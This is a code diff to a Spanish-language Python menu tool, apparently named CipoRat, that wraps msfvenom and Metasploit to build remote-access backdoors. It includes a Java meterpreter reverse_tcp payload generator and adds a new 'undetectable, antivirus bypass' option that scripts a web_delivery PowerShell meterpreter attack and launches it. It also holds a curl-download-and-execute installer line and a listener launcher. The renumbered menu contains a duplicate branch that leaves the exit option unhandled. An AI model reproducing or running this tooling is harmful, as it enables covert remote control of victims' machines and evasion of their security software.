@@ -1,5 +1,6 @@
 import os
 import sys
+import time
 
 #sys.stdout.write("\033[1;31m")
 while True:
@@ -46,13 +47,14 @@ while True:
     print("#############################################################\n")
 
     print("Bienvenido a mi herramienta de libre uso.\n")
-    print("1 - Backdoor con msfvenom (En pruebas)")
-    print("2 - Información")
-    print("3 - Instalar metasploit (SOLO LINUX)")
-    print("4 - Abrir listener en metasploit")
-    print("5 - Actualizar CipoRat")
-    print("6 - Salir\n")
-    opcion= input("Selecciona una opcion: ")
+    print("1 - Backdoor con msfvenom")
+    print("2 - Backdoor 100% indetectable (Antivirus Bypass)")
+    print("3 - Información")
+    print("4 - Instalar metasploit (SOLO LINUX)")
+    print("5 - Abrir listener en metasploit")
+    print("6 - Actualizar CipoRat")
+    print("7 - Salir\n")
+    opcion= input("Selecciona una opción: ")
     if opcion == "1":
         os.system('clear')
         print("\n1 - Backdoor-Windows con meterpreter (reverse_tcp) *Recomendado*")
@@ -173,11 +175,10 @@ while True:
                 continue
         elif msfvenom == "6":
             os.system("clear")
-            os.system("clear")
             lhost = input("Escribe la dirección ip o dns: ")
             lport = int(input("Escribe el puerto: "))
             output = input("Que nombre le quieres dar al archivo?: ")
-            os.system('clear')
+            os.system("clear")
             print("\nCreando exploit...")
             os.system("msfvenom -p java/meterpreter/reverse_tcp lhost={} lport={} -f jar -o {}.jar".format(lhost, lport, output))
             salir = input("Desea abrir el listener de metasploit? (s/n): ")
@@ -194,8 +195,33 @@ while True:
             else:
                 continue
 
-
     elif opcion == "2":
+        os.system("clear")
+        print("1 - Backdoor Indetectable (Powershell, válido para: Windows)")
+        print("2 - Backdoor Indetectable (PHP, válido para: Linux, Vps)")
+        print("3 - Backdoor Indetectable (Python, válido para: Windows, Linux, VPS)")
+        print("4 - Salir al menú principal\n")
+        code = input("Selecciona una opción: ")
+        if code == "1":
+            os.system("clear")
+            lhost = input("Escribe la dirección ip o dns: ")
+            lport = int(input("Escribe el puerto: "))
+            os.system("clear")
+            f = open("meta.rc", "w+")
+            for i in range(1):
+                f.write("use exploit/multi/script/web_delivery\n")
+                f.write("set payload windows/meterpreter/reverse_tcp\n")
+                f.write("set target 2\n")
+                f.write("set lhost {}\n".format(lhost))
+                f.write("set lport {}\n".format(lport))
+                f.write("exploit")
+            f.close()
+            print("\nGenerando código...\n")
+            time.sleep(5)
+            os.system("msfconsole -r meta.rc")
+
+
+    elif opcion == "3":
         os.system('clear')
         print("* Esta herramienta de uso libre está basado en TheFatRat\n")
         print("* El principal motivo de esta herramienta es facilitar el uso de metasploit\n")
@@ -208,14 +234,14 @@ while True:
             continue
         else:
             break
-    elif opcion == "3":
+    elif opcion == "4":
         os.system("clear")
         seguro = input("Esta función solo está disponible para linux, quieres continuar? (s/n): ")
         if seguro == "s":
             os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")
         else:
             continue
-    elif opcion == "4":
+    elif opcion == "5":
         os.system('clear')
         payload = input("Inserte el payload: ")
         lhost = input("Inserte la ip o -dns (LHOST): ")
@@ -231,7 +257,7 @@ while True:
         os.system('clear')
         print("Inciando listener...")
         os.system("msfconsole -r listener.rc")
-    elif opcion == "5":
+    elif opcion == "6":
         os.system("python3 actualizar.py")
     elif opcion == "6":
         break
